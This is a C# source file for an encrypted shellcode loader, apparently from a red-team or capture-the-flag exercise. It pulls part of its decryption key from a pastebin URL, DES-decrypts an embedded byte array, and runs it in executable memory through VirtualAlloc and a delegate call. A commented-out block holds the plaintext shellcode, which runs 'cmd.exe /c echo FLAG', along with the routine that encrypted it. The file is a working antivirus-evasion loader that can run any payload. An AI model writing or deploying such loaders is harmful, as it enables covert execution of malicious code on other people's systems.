using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Runtime.InteropServices;
using System.Net.Http;
using System.Threading.Tasks;
using System.Reflection.Metadata;

namespace payload_loader
{
    class Program
    {
        static async Task Main(string[] args)
        {
            string url = "https://pastebin.com/raw/pVLUWuCn";
            string key1 = "1234";
            string key2 = await GetPass(url);
            string key = key1 + key2;
            Console.WriteLine(key);

            // Закомментированная часть для шифрования и красивого вывода ПН

            //        byte[] payload = new byte[] {
            //            0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 
            //            0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 
            //            0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 
            //            0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 
            //            0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 
            //            0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 
            //            0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 
            //            0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 
            //            0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 
            //            0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 
            //            0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 
            //            0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 
            //            0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 
            //            0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 
            //            0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00, 0x00, 0x00, 
            //            0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b, 
            //            0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 
            //            0x9d, 0xff, 0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 
            //            0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 
            //            0xd5, 0x63, 0x6d, 0x64, 0x2e, 0x65, 0x78, 0x65, 0x20, 0x2f, 0x63, 0x20, 0x65, 0x63, 
            //            0x68, 0x6f, 0x20, 0x46, 0x4c, 0x41, 0x47, 0x00 };

            //        string plaintext = Convert.ToBase64String(payload);

            //        Console.WriteLine("Original Text: " + plaintext);

            //        string encrypted = Encrypt(plaintext, key);
            //        Console.WriteLine("Encrypted: " + encrypted);
            //        byte[] encryptedBytes = Convert.FromBase64String(encrypted);
            //        Console.WriteLine("byte[] encryptedArray = new byte[] { " +
            //string.Join(", ", Array.ConvertAll(encryptedBytes, b => "0x" + b.ToString("X2"))) +
            //" };");

            byte[] encrypted = new byte[] {
                    0xB6, 0xAC, 0x8C, 0x1D, 0xE4, 0xBF, 0x9B, 0xE5, 0x59, 0xA6, 0xC4, 0xD6, 0x76, 0xD7, 0x06, 
                    0x02, 0x89, 0x18, 0x67, 0xF8, 0x21, 0x0E, 0xBE, 0xA4, 0x14, 0xEC, 0x6B, 0xF2, 0x8B, 0xA8, 
                    0xE8, 0x0C, 0x4B, 0x26, 0x5F, 0x0C, 0x6A, 0x78, 0x5D, 0x99, 0xB7, 0xDD, 0x3E, 0x06, 0x32, 
                    0x92, 0xA3, 0x11, 0x1A, 0x87, 0xE8, 0x4B, 0x2D, 0x85, 0x4C, 0x7C, 0x22, 0x08, 0x6A, 0x72, 
                    0x5E, 0xFE, 0x59, 0x87, 0x61, 0x4D, 0x6C, 0x72, 0xA0, 0xB9, 0x4E, 0xAE, 0xD1, 0xBF, 0x30, 
                    0xC3, 0x08, 0x49, 0xC2, 0xD0, 0x63, 0x04, 0xC1, 0x26, 0x4C, 0x8B, 0xBB, 0x99, 0x0B, 0x23, 
                    0x6D, 0x60, 0x62, 0x43, 0x32, 0x15, 0xEE, 0xB0, 0x90, 0x8D, 0x4D, 0xA4, 0x39, 0x21, 0xD9, 
                    0xB6, 0x74, 0xC4, 0xD1, 0xC8, 0x0A, 0xD9, 0xEE, 0x32, 0xB3, 0x80, 0x0D, 0x4F, 0x43, 0xB5, 
                    0xA0, 0x1C, 0x32, 0xDF, 0xDC, 0xAE, 0x8F, 0xB1, 0xB1, 0xE6, 0x50, 0x6B, 0x77, 0xC4, 0x9F, 
                    0xA3, 0xF3, 0x77, 0xE8, 0x21, 0xA0, 0x3E, 0x9B, 0xA8, 0x2D, 0x56, 0x4F, 0xB3, 0xA6, 0x79, 
                    0xA0, 0xED, 0x04, 0xD1, 0xFA, 0x69, 0xC9, 0x4B, 0xCE, 0xA6, 0x12, 0x35, 0x3F, 0x2C, 0x57, 
                    0xC1, 0x30, 0xDB, 0x88, 0xCB, 0x3A, 0x3F, 0x1B, 0x3A, 0xC5, 0x13, 0x7D, 0xCA, 0xEE, 0x33, 
                    0x96, 0xB3, 0xA8, 0xA8, 0x11, 0xC1, 0x7E, 0xCD, 0xE5, 0x2E, 0x07, 0x8D, 0x4D, 0x84, 0x60, 
                    0x17, 0x04, 0xD2, 0xC9, 0x5E, 0x99, 0xDF, 0xB3, 0xC4, 0x45, 0xA3, 0x26, 0x32, 0x6C, 0x49, 
                    0x77, 0xA7, 0x89, 0xCD, 0x1F, 0xB6, 0xBB, 0xE1, 0x12, 0xF9, 0x7A, 0xDF, 0x71, 0x16, 0x56, 
                    0x88, 0xE7, 0x2E, 0x75, 0xFA, 0x1F, 0x15, 0x78, 0x5B, 0x28, 0xEB, 0xF6, 0x3F, 0x62, 0xD1, 
                    0x5A, 0x2F, 0x69, 0x83, 0x6E, 0xEE, 0x49, 0xF4, 0x46, 0x29, 0xE5, 0xFB, 0xFB, 0x1F, 0x29, 
                    0xF9, 0xF6, 0x2E, 0x27, 0x32, 0xA2, 0x7F, 0xA3, 0xE0, 0xE1, 0x45, 0x65, 0x3F, 0xE9, 0x54, 
                    0xE7, 0x8D, 0x66, 0x4D, 0x4D, 0x3B, 0xB1, 0x22, 0x34, 0xA3, 0x7A, 0x12, 0x19, 0xCC, 0xFD, 
                    0x1B, 0xF0, 0xFE, 0x4D, 0x3A, 0x83, 0xE9, 0x77, 0x62, 0x7B, 0xE8, 0x71, 0xFB, 0xFA, 0xB8, 
                    0xDB, 0x81, 0xED, 0x71, 0x54, 0x46, 0x5A, 0x7A, 0x52, 0x03, 0x83, 0xA0, 0x0D, 0xA0, 0xBB, 
                    0xEE, 0x51, 0x32, 0x2F, 0x54, 0x77, 0x0F, 0x4E, 0xB0, 0x66, 0xF2, 0xC4, 0x1C, 0x15, 0x4C, 
                    0x03, 0x01, 0x74, 0x3A, 0xB7, 0xFB, 0x38, 0xF2, 0x13, 0x8C, 0x26, 0x6A, 0x79, 0x32, 0xC3, 
                    0x10, 0xD4, 0x7D, 0x91, 0xF1, 0x1B, 0x5A, 0x85, 0x09, 0xA0, 0xEA, 0x74, 0x98, 0x78, 0x57, 
                    0x74, 0x6B, 0xAA, 0x80, 0x92, 0x71, 0x32, 0x55, 0xA6, 0x0A, 0x56, 0x38, 0x1C, 0x74, 0x20, 
                    0xDF, 0x14, 0x5B, 0x45, 0x66, 0xF0, 0xF4, 0x03, 0x4C, 0x93, 0x32, 0x7F, 0x4A, 0x6E, 0x95, 
                    0xE4, 0x50 };

            string decrypted = Convert.ToBase64String(encrypted);

            decrypted = Decrypt(decrypted, key);
            //Console.WriteLine("Decrypted: " + decrypted);

            byte[] decryptedBytes = Convert.FromBase64String(decrypted);

            ShellcodeLoader.RunShellcode(decryptedBytes);
        }

        public static async Task<string> GetPass(string url)
        {
            using HttpClient client = new HttpClient();
            string content = await client.GetStringAsync(url);
            //Console.WriteLine(content);
            return content;
        }

        public static string Encrypt(string plainText, string key)
        {
            if (key.Length < 8)
                throw new ArgumentException("Key must be at least 8 characters long.");

            using (DESCryptoServiceProvider des = new DESCryptoServiceProvider())
            {
                des.Mode = CipherMode.CBC;
                des.Padding = PaddingMode.PKCS7;
                des.Key = Encoding.UTF8.GetBytes(key.Substring(0, 8));
                des.IV = Encoding.UTF8.GetBytes(key.Substring(0, 8));

                byte[] plainBytes = Encoding.UTF8.GetBytes(plainText);
                using (MemoryStream ms = new MemoryStream())
                using (CryptoStream cs = new CryptoStream(ms, des.CreateEncryptor(), CryptoStreamMode.Write))
                {
                    cs.Write(plainBytes, 0, plainBytes.Length);
                    cs.FlushFinalBlock();
                    return Convert.ToBase64String(ms.ToArray());
                }
            }
        }

        public static string Decrypt(string cipherText, string key)
        {
            if (key.Length < 8)
                throw new ArgumentException("Key must be at least 8 characters long.");

            using (DESCryptoServiceProvider des = new DESCryptoServiceProvider())
            {
                des.Mode = CipherMode.CBC;
                des.Padding = PaddingMode.PKCS7;
                des.Key = Encoding.UTF8.GetBytes(key.Substring(0, 8));
                des.IV = Encoding.UTF8.GetBytes(key.Substring(0, 8));

                byte[] cipherBytes = Convert.FromBase64String(cipherText);
                using (MemoryStream ms = new MemoryStream())
                using (CryptoStream cs = new CryptoStream(ms, des.CreateDecryptor(), CryptoStreamMode.Write))
                {
                    cs.Write(cipherBytes, 0, cipherBytes.Length);
                    cs.FlushFinalBlock();
                    return Encoding.UTF8.GetString(ms.ToArray());
                }
            }
        }
    }

    public static class ShellcodeLoader
    {
        public static void RunShellcode(byte[] shellcode)
        {
            IntPtr funcAddr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x1000, 0x40);
            Marshal.Copy(shellcode, 0, funcAddr, shellcode.Length);
            pFunc f = (pFunc)Marshal.GetDelegateForFunctionPointer(funcAddr, typeof(pFunc));
            f();
        }

        [DllImport("kernel32.dll")]
        private static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        private delegate void pFunc();
    }
}
